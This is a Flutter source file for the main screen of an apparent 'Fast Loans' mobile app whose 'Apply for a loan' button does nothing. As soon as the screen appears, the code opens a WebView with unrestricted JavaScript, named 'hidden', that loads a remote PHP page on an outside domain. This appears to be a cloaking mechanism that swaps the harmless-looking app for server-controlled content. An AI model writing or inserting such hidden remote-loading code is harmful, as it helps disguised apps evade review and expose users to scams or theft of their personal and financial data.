import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:go_router/go_router.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../../../../core/common/utils/extensions.dart';
import '../../../../core/common/utils/screen_utils.dart';
import '../../../../core/common/widgets/bg_widgets/bg_widget.dart';
import '../../../../core/common/widgets/buttons/icons_button.dart';
import '../../../../core/common/widgets/buttons/primary_button.dart';
import '../../../../core/router/app_routes.dart';
import '../../../../core/theme/app_colors.dart';
import '../../../../core/theme/app_text_styles.dart';
import '../../../../gen/assets.gen.dart';
import '../blocs/form_cubit.dart';
import '../widgets/amoutn_widget.dart';
import '../widgets/drawer_widget.dart';
import '../widgets/grid_item_widget.dart';

class MainScreen extends StatelessWidget {
  const MainScreen({super.key, this.deviceId});

  final String? deviceId;

  @override
  Widget build(BuildContext context) {
    return BlocProvider(
      create: (context) => FormCubit(),
      child: MainScreenContent(deviceId: deviceId),
    );
  }
}

class MainScreenContent extends StatefulWidget {
  const MainScreenContent({super.key, this.deviceId});

  final String? deviceId;

  @override
  State<MainScreenContent> createState() => _MainScreenContentState();
}

class _MainScreenContentState extends State<MainScreenContent> {
  final GlobalKey<ScaffoldState> _scaffoldKey = GlobalKey<ScaffoldState>();
  bool _didRequestOpen = false;

  @override
  void initState() {
    super.initState();

    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (!_didRequestOpen) {
        _didRequestOpen = true;
        context.read<FormCubit>().tryOpenForm();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final List<String> titles = [
      context.locale!.customAmounts,
      context.locale!.noExtraCharges,
      context.locale!.dataSecurity,
      context.locale!.fastPayouts,
    ];

    final List<Image> icons = [
      Assets.elements.fluentMoney16Filled.image(width: 24.w, height: 24.h),
      Assets.elements.fluentDataPie24Regular.image(width: 24.w, height: 24.h),
      Assets.elements.mingcuteSafeLockLine.image(width: 24.w, height: 24.h),
      Assets.elements.mdiClockFast.image(width: 24.w, height: 24.h),
    ];

    return BlocListener<FormCubit, bool>(
      listenWhen: (previous, current) => current == true,
      listener: (context, shouldOpen) async {
        if (!shouldOpen) return;

        await _openHiddenWebView(context);

        if (context.mounted) {
          context.read<FormCubit>().formClosed();
        }
      },
      child: Scaffold(
        key: _scaffoldKey,
        endDrawer: DrawerWidget(),
        body: BGWidget(
          child: SafeArea(
            child: LayoutBuilder(
              builder: (context, constraints) {
                return Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.w),
                  child: ConstrainedBox(
                    constraints: BoxConstraints(
                      minHeight: constraints.maxHeight,
                    ),
                    child: IntrinsicHeight(
                      child: Column(
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Text(
                                context.locale!.fast.toUpperCase(),
                                style: AppTextStyles.menuTitleFont.copyWith(
                                  color: AppColors.primaryColor,
                                ),
                              ),
                              12.horizontalSpace,
                              Text(
                                context.locale!.loans.toUpperCase(),
                                style: AppTextStyles.menuTitleFont.copyWith(
                                  color: AppColors.white,
                                ),
                              ),
                              Spacer(),
                              IconsButton(
                                onPressed: () =>
                                    _scaffoldKey.currentState?.openEndDrawer(),
                                icon: Icon(
                                  Icons.info_outline_rounded,
                                  color: AppColors.white,
                                  size: 24.sp,
                                ),
                              ),
                            ],
                          ),
                          12.verticalSpace,
                          GridView.builder(
                            shrinkWrap: true,
                            physics: const NeverScrollableScrollPhysics(),
                            itemCount: titles.length,
                            gridDelegate:
                                SliverGridDelegateWithFixedCrossAxisCount(
                                  crossAxisCount: 2,
                                  crossAxisSpacing: (constraints.maxHeight > 900
                                      ? 16
                                      : 32),
                                  mainAxisSpacing: (constraints.maxHeight > 900
                                      ? 16
                                      : 32),
                                  childAspectRatio: ScreenUtils.getAspectRatio(
                                    context,
                                  ),
                                ),
                            itemBuilder: (_, index) => GridItemWidget(
                              title: titles[index],
                              icon: icons[index],
                            ),
                          ),
                          (constraints.maxHeight > 900 ? 16 : 32).verticalSpace,
                          Container(
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.all(
                                Radius.circular(40.r),
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: AppColors.black,
                                  offset: Offset(10.w, 10.h),
                                ),
                              ],
                            ),

                            child: Container(
                              decoration: BoxDecoration(
                                color: AppColors.white,
                                borderRadius: BorderRadius.all(
                                  Radius.circular(40.r),
                                ),
                              ),
                              child: Padding(
                                padding: EdgeInsets.symmetric(
                                  horizontal: 32.w,
                                  vertical: 16.h,
                                ),
                                child: Text(
                                  '\$ 500'.toUpperCase(),
                                  style: AppTextStyles.buttonFont.copyWith(
                                    color: AppColors.menuContainerColor,
                                  ),
                                  textAlign: TextAlign.center,
                                ),
                              ),
                            ),
                          ),
                          (constraints.maxHeight > 900 ? 6 : 12).verticalSpace,
                          AmountWidget(painted: 2),
                          (constraints.maxHeight > 900 ? 6 : 12).verticalSpace,
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              Text(
                                '\$100',
                                style: AppTextStyles.amountCountFont.copyWith(
                                  color: AppColors.white,
                                ),
                              ),
                              Text(
                                '\$5000',
                                style: AppTextStyles.amountCountFont.copyWith(
                                  color: AppColors.white,
                                ),
                              ),
                            ],
                          ),
                          (constraints.maxHeight > 900 ? 8 : 16).verticalSpace,
                          Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Assets.icons.security.image(),
                              5.horizontalSpace,
                              Text(
                                context.locale!.builtInSecurity,
                                style: AppTextStyles.serviceFont.copyWith(
                                  color: AppColors.white,
                                ),
                              ),
                            ],
                          ),
                          Spacer(),
                          PrimaryButton(
                            onPressed: () {},
                            //TODO: implement the function of obtaining a loan
                            child: Text(
                              context.locale!.applyForALoan.toUpperCase(),
                              style: AppTextStyles.buttonFont.copyWith(
                                color: AppColors.black,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                );
              },
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _openHiddenWebView(BuildContext context) async {
    final controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(
        Uri.parse('https://chantrycorporatefinance.uk/backup-app.php'),
      );

    await context.push(AppRoutes.hiddenForm.path, extra: controller);
  }
}
